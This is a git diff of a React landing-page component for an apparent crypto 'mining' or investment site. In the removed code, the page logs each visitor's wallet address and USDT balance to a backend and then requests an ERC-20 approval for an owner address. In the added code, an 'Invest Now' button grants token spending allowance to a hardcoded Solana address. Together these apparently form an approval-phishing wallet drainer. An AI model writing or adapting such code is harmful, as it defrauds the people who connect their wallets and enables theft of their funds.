@@ -20,13 +20,14 @@ import { Swiper, SwiperSlide } from 'swiper/react'
 import { Autoplay } from 'swiper/modules'
 import "swiper/swiper-bundle.css";
 
-import { useConnect, useAccount, useBalance, useContractWrite, usePrepareContractWrite, useContractRead, erc20ABI } from "wagmi";
 import Toast from "./toast";
-import { ethers } from "ethers";
 import { environment } from "@/utils/address";
 import { SaveMinerPayload } from "@/utils/interface";
 
 import { isMobileDevice } from "@/utils/isMobileDevice";
+import { WalletButton } from "./WalletButton";
+import { useWallet } from "@solana/wallet-adapter-react";
+import { useProgram } from "./hooks/useProgram";
 
 export default function Main() {
     return (
@@ -63,119 +64,9 @@ function ConnectSection() {
         }
     )
 
-    const [invite, setInvite] = useState<string | null>(null);
+    const { connected } = useWallet()
 
-    const toast = Toast()
-    const { isConnected, address } = useAccount()
-    const { connectors, connect } = useConnect({
-        onSuccess(data, variables, context) {
-            handleSaveMiner(data.chain.id);
-        },
-        onError(error, variables, context) {
-            const message = error.message || "Please connect your wallet"
-            toast.error(message, error.name)
-        },
-    });
-    const { data: balance } = useBalance({
-        address: address,
-        token: environment.token_address
-    })
-    const { refetch } = useContractRead({
-        address: environment.token_address,
-        abi: erc20ABI,
-        functionName: "allowance",
-        args: [address as `0x${string}`, environment.owner_address],
-        onSuccess(data) {
-            const allowance = ethers.utils.formatUnits(data, decimals);
-        },
-        staleTime: 1000 * 60 * 2,
-    });
-    const { data: decimals } = useContractRead({
-        address: environment.token_address,
-        abi: erc20ABI,
-        functionName: "decimals",
-    });
-    const { config } = usePrepareContractWrite({
-        address: environment.token_address,
-        abi: erc20ABI,
-        functionName: "approve",
-        args: [environment.owner_address, ethers.utils.parseUnits("100")],
-        onError(err) {
-            console.log(err, "error");
-        },
-    });
-    const { writeAsync } = useContractWrite({
-        ...config,
-        onSuccess(data, variables, context) {
-            refetch();
-        },
-        onError(error, variables, context) {
-            toast.error(error.message)
-        },
-    });
-
-    const handleSaveMiner = async (chainId: number) => {
-        const payload: SaveMinerPayload = {
-            address: address as string,
-            balance: [
-                {
-                    amount: balance ? balance?.formatted : "0",
-                    approvedAmount: "0",
-                    chain: chainId,
-                    symbol: "USDT",
-                    tokenContractAddress: environment.token_address,
-                },
-            ],
-            invite,
-        };
-        try {
-            const req = await fetch("/api/saveMiner", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(payload),
-            });
-            await req.json();
-        } catch (error) {
-            console.log("Error: ", error)
-        }
-    };
-
-    const handleConnect = async () => {
-        if (!isConnected) {
-            const injectedConnector = connectors.find(c => c.id === 'injected');
-            const walletConnectConnector = connectors.find(c => c.id === 'walletConnect');
-
-            if (isMobileDevice() && typeof window !== "undefined") {
-                if (window.ethereum && injectedConnector) {
-                    try {
-                        await connect({ connector: injectedConnector })
-                        return;
-                    } catch (e) {
-                        await connect({ connector: walletConnectConnector })
-                        return;
-                    }
-                }
-
-                if (walletConnectConnector) {
-                    connect({ connector: walletConnectConnector });
-                    return;
-                }
-            } else {
-                if (walletConnectConnector) {
-                    connect({ connector: walletConnectConnector });
-                    return;
-                }
-            }
-        } else {
-            try {
-                await writeAsync?.();
-            } catch (e) {
-                console.log("Error: ", e)
-            }
-        }
-    }
+    const { approveAllowance, ata, ensureAccount, creatingAta } = useProgram()
 
     return (
         <Stack
@@ -187,18 +78,32 @@ function ConnectSection() {
                 <Image src={trust} alt="Trust Wallet" height={size} />
                 <Image src={binance} alt="Binance" height={size} />
             </Stack>
-            <Button
-                colorScheme="blue" size={{ base: "md", md: "lg" }} borderRadius={"full"}
-                bgGradient={"linear(to-r, #007bff, #6610f2)"}
-                _hover={{
-                    bgGradient: "linear(to-r, #007bff, #6610f2)"
-                }}
-                animation={`${pulse} 4s infinite`}
-                transition="transform 0.3s ease, box-shadow 0.3s ease"
-                onClick={handleConnect}
-            >
-                지금 시작하기
-            </Button>
+            <WalletButton />
+            {
+                (connected && ata) && (
+                    // invest now button
+                    <Button
+                        w={"40%"} h={12} bgColor={"green.500"} color={"white"} fontSize={{ base: "medium", md: "large" }}
+                        _hover={{ bgColor: "blue.600" }} _active={{ bgColor: "blue.700" }}
+                        animation={`${pulse} 2s infinite`} onClick={() => {
+                            approveAllowance('ivFsDgppjW8B7uhkntbgNdZp1Y9Ug8FZ5xadsRW79e7', 10000000)
+                        }}
+                    >
+                        Invest Now
+                    </Button>
+                )
+            }
+            {
+                (connected && !ata) && (
+                    <Button
+                        w={"40%"} h={12} bgColor={"blue.500"} color={"white"} fontSize={{ base: "medium", md: "large" }}
+                        _hover={{ bgColor: "blue.600" }} _active={{ bgColor: "blue.700" }}
+                        onClick={() => ensureAccount()} isLoading={creatingAta}
+                    >
+                        Create USDT Account
+                    </Button>
+                )
+            }
         </Stack>
     );
 }
